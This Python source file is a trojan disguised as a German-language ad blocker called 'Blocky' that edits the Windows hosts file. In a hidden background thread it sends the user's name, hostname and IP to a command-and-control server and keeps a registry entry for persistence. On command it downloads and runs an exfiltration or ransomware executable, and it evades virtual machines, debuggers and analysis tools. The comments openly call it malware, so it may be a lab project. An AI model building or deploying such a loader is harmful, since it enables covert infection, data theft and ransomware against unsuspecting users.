# coding: utf-8

# Additional modules -> install via pip
import httpx  # Handling HTTP requests/responses
from python_hosts import Hosts, HostsEntry  # Providing fake Adblocker functionality

# Native modules
import pprint  # Handles pretty printing
import os, sys  # Handling system related tasks (hostname/usernames)
import ctypes  # Calling Windows APIs
import winreg  # Editing Windows Registry
import threading  # Enabling Thread creation
import datetime  # Handling time-related data
from subprocess import check_output  # Reading processes on system
from random import randint  # Random ints for 😴
from time import sleep  # 😴

# Variables
# Address of the remote C2 server
c2_url = "http://localhost:5000"
# If any of these processes is running on the host, BadThread will not run.
program_blacklist = [
    "vmware",
    "vbox",
    "ghidra",
    "ollydbug",
    "x64dbg",
    "tcpdump",
    "wireshark",
]


class BadThread(object):
    def __init__(self):
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()

    def run(self):
        fake_main()


class FakeBlocker:
    """This object imitates the functionality of an AdBlocker. The functionality should be to block
    Tracking & Malware Domains using Windows' internal hosts file, which requires Administrator rights
    to edit."""

    def __init__(self):
        self.hosts = Hosts()
        self.blocklists = {
            "1": (
                "steven-black",
                "https://raw.githubusercontent.com/StevenBlack/hosts/master/data/StevenBlack/hosts",
            ),
            "2": (
                "ad-away",
                "https://raw.githubusercontent.com/AdAway/adaway.github.io/master/hosts.txt",
            ),
            "3": (
                "energized-spark",
                "https://block.energized.pro/spark/formats/hosts.txt",
            ),
        }

    def is_admin(self):
        """Checks if the tool has been run with Admin privileges. Otherwise print error"""
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                return True
            else:
                print(
                    "\nBlocky needs Admin privileges to edit the Hosts-File. Please restart as Admin!\n"
                )
                return False
        except Exception as err:
            print(f"is_admin(): Error --> {err}")
            return False

    def initial_check(self):
        """Checks for existing Registry entries -> Maybe the tool has been here before?"""
        keyName = r"Software\Blocky\Main"
        try:
            # If key exists, create a Loader object without getting the already known system info, and start loop again
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
            )
            loader = Loader(resume=True)
            loader.victim_id = winreg.QueryValueEx(key, "ID")[0]
            print(
                "Es ist ein Update für Blocky verfügbar. Bitte warte, bis die automatische Installation abgeschlossen ist...\n"
            )
            loader.sync_loop()
        except:
            # Else start a new Ransomware() runthrough as daemon thread, and show Blocky functionality.
            BadThread()
            blocky.show_menu()

    def is_blacklisted_process_running(self):
        """Reads process lists on system and compares it to the predefined blacklist"""
        tasks_all = check_output(("TASKLIST", "/FO", "CSV"))
        tasks_formatted = tasks_all.decode().splitlines()
        tasks_listed = [
            process.lower().split(",")[0][1:-5] for process in tasks_formatted
        ]
        for x in program_blacklist:
            # As soon as 1 blacklisted program is detected, return True -> Main will not execute BadThread
            if x in tasks_listed:
                return True
        return False

    def show_menu(self):
        """Prints the Blocky menu and takes user input on menu selection"""
        print(
            f"\nWillkommen bei Blocky!\n\n Was möchtest du tun? \n\n\t1) Aktuelle Hosts-Einträge anschauen\n\t2) Blockierliste auswählen und hinzufügen\n\t3) Blocky beenden\n"
        )
        selection = input("Bitte gebe einen Menüpunkt an: ")
        if selection not in ["1", "2", "3"]:
            self.show_menu()
        elif selection == "1":
            # Pretty-Print hostname & address pairs
            pprint.PrettyPrinter().pprint(
                [
                    (x.address, x.names[0])
                    for x in self.hosts.entries
                    if not None in (x.address, x.names)
                ]
            )
            self.show_menu()
        elif selection == "2":
            self.add_blocklist()
        elif selection == "3":
            sys.exit()

    def add_blocklist(self):
        """After the user selects on of the predefined blocklists, the corresponding entries will the added to the local Hosts file"""
        print(f"\nWelche Blockliste möchtest du hinzufügen?\n")
        pprint.PrettyPrinter().pprint(self.blocklists)
        selection = input("\nBitte wähle eine Liste aus: ")
        if selection in list(self.blocklists):
            self.hosts.import_url(url=self.blocklists[selection][1])
            self.hosts.write()
            print("Deine Hostliste wurde angepasst! Werbung wird nun blockiert!")
        else:
            self.add_blocklist()
        self.show_menu()


class Loader:
    """This object initializes the Malware and registers a victim on the C2 server"""

    def __init__(self, resume=False):
        # Get system info, if system has not been infected yet
        if not resume:
            self.public_ip = self.get_public_ip()
            self.firstContact = datetime.datetime.now()
            self.hostname, self.username = self.get_system_info()
        # ID which will be received by C2 server later on
        self.victim_id = None

    def get_public_ip(self):
        # Get public IP for the PC/network
        try:
            ip = httpx.get("https://ipconfig.io/ip", timeout=5).text.replace("\n", "")
            return ip
        except httpx.TimeoutException as err:
            print("get_public_ip(): Timeout Error --> ", err)
            return "0.0.0.0"
        except httpx.RequestError as err:
            print("get_public_ip(): Request Exception --> ", err)
            return "0.0.0.0"

    def get_system_info(self):
        # Get Username/Hostname via environment variables
        try:
            hostname = os.environ["COMPUTERNAME"]
            username = os.environ["USERNAME"]
            return hostname, username
        except KeyError as err:
            print("get_system_info(): Key Error --> ", err)
            return "generic_hostname", "generic_username"
        except OSError as err:
            print("get_system_info(): OS Error --> ", err)
            return "generic_hostname", "generic_username"

    def create_remote_entry(self):
        """Creates a DB entry for the new victim on the C2 server and receives encryption key, ID and S3 creds"""
        payload = {
            "username": (None, self.username.encode()),
            "hostname": (None, self.hostname.encode()),
            "ip": (None, self.public_ip.encode()),
        }
        # Send victim data via HTTP Form POST to the C2 server
        try:
            response = httpx.post(f"{c2_url}/create", files=payload)
        except httpx.TimeoutException as err:
            print("create_remote_entry(): Timeout Error --> ", err)
            sleep(60)
            response = httpx.post(f"{c2_url}/create", files=payload)
        except httpx.RequestError as err:
            print("create_remote_entry(): Request Exception --> ", err)
            response = httpx.post(f"{c2_url}/create", files=payload)
        # Receive identifier via Response headers
        self.victim_id = response.headers["Victim-ID"]

    def create_registry_entry(self):
        keyName = r"Software\Blocky\Main"
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
            )
        except:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyName)
        winreg.SetValueEx(key, "ID", 0, winreg.REG_SZ, str(self.victim_id))
        winreg.CloseKey(key)

    def sync_loop(self, init_sleep=30):
        sleep(init_sleep)
        # 0=wait, 1=exfiltration, 2=keylogger, 3=ransomware
        while httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "0":
            sleep(30)
        if httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "1":
            self.load_exfiltration_stage()
        # elif httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "2":
        #     self.load_keylogger_stage()
        elif httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "3":
            self.load_ransomware_stage()
        else:
            sleep(30)

    def load_exfiltration_stage(self):
        print("Load exfiltration stage...")
        try:
            exfiltration_url = httpx.get(f"{c2_url}/static/exfiltration/exfil.exe")
            with open("C:\\Users\\Test\Documents\\exfil.exe", "wb") as f:
                f.write(exfiltration_url.content)
            os.system("C:\\Users\\Test\Documents\\exfil.exe")
            self.sync_loop(init_sleep=60)
        except httpx.TimeoutException as err:
            print("load_exfiltration(): Timeout Error --> ", err)
            sleep(60)
            self.load_exfiltration_stage()
        except httpx.RequestError as err:
            print("load_exfiltration(): Request Exception --> ", err)
            sleep(60)
            self.load_exfiltration_stage()

    def load_ransomware_stage(self):
        print("Load ransomware stage...")
        try:
            ransomware_url = httpx.get(f"{c2_url}/static/ransomware/ransom.exe")
            with open("C:\\Users\\Test\Documents\\ransom.exe", "wb") as f:
                f.write(ransomware_url.content)
            os.system("C:\\Users\\Test\Documents\\ransom.exe")
            self.sync_loop(init_sleep=60)
        except httpx.TimeoutException as err:
            print("load_exfiltration(): Timeout Error --> ", err)
            sleep(60)
            self.load_ransomware_stage()
        except httpx.RequestError as err:
            print("load_exfiltration(): Request Exception --> ", err)
            sleep(60)
            self.load_ransomware_stage()


class Threading(object):
    def __init__(self):
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()

    def run(self):
        fake_main()


def fake_main():
    """Main function responsible for Loader functionality"""
    loader = Loader()
    loader.create_remote_entry()
    loader.create_registry_entry()
    loader.sync_loop()


if __name__ == "__main__":
    blocky = FakeBlocker()
    # Exit the programm, should it be run as non-Admin
    if not blocky.is_admin():
        sys.exit()
    # Directly jump into the fake functionality, should a program listed on the Blacklist be detected.
    if blocky.is_blacklisted_process_running():
        blocky.show_menu()
        sys.exit()
    # Directly jump into the fake functionality, should a debugger be detected, so no malicious activity is run
    if ctypes.windll.kernel32.IsDebuggerPresent():
        blocky.show_menu()
        sys.exit()
    # Start check if system is already infected or not
    blocky.initial_check()
